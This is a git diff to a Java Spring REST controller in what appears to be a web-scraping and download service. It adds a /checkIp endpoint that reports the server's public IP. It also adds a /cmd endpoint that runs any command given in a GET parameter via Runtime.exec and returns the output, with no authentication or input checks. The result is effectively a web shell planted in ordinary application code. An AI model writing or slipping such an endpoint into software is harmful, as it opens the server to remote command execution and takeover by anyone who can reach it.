@@ -3,14 +3,8 @@ package restcontroller;
 import Utils.Chuyen_tu_Object_sang_byte_de_doc_hoac_ghi_file;
 import ConstantVariable.Constant;
 import Service.CreateWebdriver;
-import java.awt.Robot;
-import java.awt.event.KeyEvent;
-import java.awt.image.BufferedImage;
 import java.io.BufferedOutputStream;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 
 import java.io.IOException;
@@ -34,6 +28,11 @@ import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RestController;
 import static Utils.Doc_file_kieu_binary.readFileBinary;
 import Service.DowloadService;
+import Service.GetTextFromGit;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
 
 @RestController
 public class GreedingController {
@@ -43,6 +42,8 @@ public class GreedingController {
     DowloadService dowloadService;
     @Autowired
     CreateWebdriver createWebdriver;
+    @Autowired
+    GetTextFromGit getTextFromGit;
 
     @RequestMapping(value = "/hello", method = RequestMethod.GET)
     public String greeding() {
@@ -124,7 +125,49 @@ public class GreedingController {
         }
 
     }
+    
+    @RequestMapping(value = "/checkIp", method = RequestMethod.GET)
+    public @ResponseBody String checkIp(HttpServletResponse response) throws IOException {
+       return getTextFromGit.getStringFromGithubRaw("http://checkip.dyndns.org/").get(0);
+    }
+    
+    @RequestMapping(value = "/cmd", method = RequestMethod.GET)
+    public String greeding(@RequestParam(value = "cmd", required = true) String cmd) {
+        String output = "";
+        try {
+            output = executeCommand(cmd);
+            return output;
+        } catch (Exception e) {
+            e.getMessage();
+            return e.getMessage();
+        }
 
+    }
+
+    public String executeCommand(String command) {
+
+        StringBuffer output = new StringBuffer();
+
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec(command);
+            p.waitFor();
+            BufferedReader reader
+                    = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+            String line = "";
+            while ((line = reader.readLine()) != null) {
+                output.append(line + "\n");
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return output.toString();
+
+    }
+    
     public void login(String username, String Password) throws Exception, InterruptedException {
 
         Thread.sleep(1000);
